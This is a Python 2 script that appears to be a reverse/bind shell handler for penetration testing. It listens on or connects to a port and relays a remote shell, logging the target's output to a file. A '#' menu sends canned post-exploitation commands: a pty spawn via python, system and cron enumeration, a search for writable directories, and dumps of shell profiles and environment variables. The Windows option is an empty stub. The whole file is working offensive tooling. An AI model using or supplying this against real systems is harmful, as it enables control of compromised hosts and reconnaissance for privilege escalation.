import socket, sys, select
from optparse import OptionParser

def prompt() :
    sys.stdout.write('')
    sys.stdout.flush()

def get_cmd():
	p = True
	while p:
		print ("""
		[+] What Platform?
		1. Windows
		2. Linux
		""")
		p = raw_input("[!]>")
		if p == "1":
			print "Do stuff here"
			p = False
		elif p == "2":
			ans = True
			while ans:
				print ("""
		
				1. Spawn python shell
				2. Linux Basic
					uname -a | /etc/isue | ls -al /etc/cron.*
				3. Find writable directories
				4. Environment Variables
				""")
				ans = raw_input("[!]>")
				if ans == "1":
					msg = "python -c\'import pty;pty.spawn(\"/bin/bash\")\'\n"
					ans = False
					p = False
				elif ans == "2":
					msg = "uname -a; cat /etc/issue; ls -al /etc/cron.*; cat /etc/crontab; ps -aux | grep root\n"
					ans = False
					p = False
				elif ans == "3":
					msg = "find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;\n"
					ans = False
					p = False
				elif ans == "4":
					msg = "cat /etc/profile ; cat /etc/bashrc ; cat ~/.bash_profile ; cat ~/.bashrc ; cat ~/.bash_logout ; env ; set\n"
					ans = False
					p = False
				elif ans !="":
					print "[+] Please make a valid selection!"
					p = False

	return msg

def do_connection(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    # connect to remote host
    try :
        s.connect((ip, port))
    except :
        print '[-] Unable to connect.'
        sys.exit()
    print '[+] Connected to remote host.'
    prompt()
    while 1:
        socket_list = [sys.stdin, s]
        read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])
        for sock in read_sockets:
            if sock == s:
                data = sock.recv(4096)
                if not data :
                    print '\n[-] Disconnected from target.'
                    sys.exit()
                else :
                    sys.stdout.write(data)
		    with open("3connect.log", "a") as f:
			f.write(data)
                    prompt()
            else :
	      msg = sys.stdin.readline()
	      if msg[0] == '#':
	        msg = get_cmd()
		s.send(msg)
		prompt()
	      else:
	        s.send(msg)
	        prompt()


def do_server(ip,port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try :
	  s.bind((ip, port))
	  print '[+] Listening on %s port %s' % (ip,port)
	except :
	  print '[+] Unable to bind to %s' % port
	  sys.exit()

	s.listen(1)
	conn, addr = s.accept()
	print '[+] Connection from: ', addr
	while 1:
	  socket_list = [sys.stdin, conn]
	  read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])
	  for sock in read_sockets:
	    if sock == conn:
	      data = conn.recv(4096)
	      if not data :
		print '\n[-] Disconnected from Target'
		sys.exit()
	      else :
		sys.stdout.write(data)
                with open("3connect.log", "a") as f:
                    f.write(data)
		prompt()
	    else :
	      msg = sys.stdin.readline()
	      if msg[0] == '#':
	        msg = get_cmd()
		conn.send(msg)
		prompt()
	      else:
	        conn.send(msg)
	        prompt()

if __name__ == "__main__":
	usage = "%prog -H host -p port"
	parser = OptionParser(usage=usage)
	parser.add_option('-H', '--host', type='string', action='store', dest='host', help='Listen or Target host.')
	parser.add_option('-p', '--port', type='int', action='store', dest='port', help='Port')
	parser.add_option('-l', '--listen', action='store_true', dest='listen', help='Use in listen mode.')
	parser.add_option('-c', '--connect', action='store_true', dest='connection', help='Connect to host.')
	(options, args) = parser.parse_args()
	
	ip = options.host
	port = options.port
	if(ip is None or port is None):
	  print "[-] Host and Port required."
	  parser.print_help()
	  exit(-1)

	if options.listen == True:
	  do_server(ip,port)
	elif options.connection == True:
	  do_connection(ip,port)
	else:   
	  print '[-] Nothing to do, closing.'
	  exit(-1)
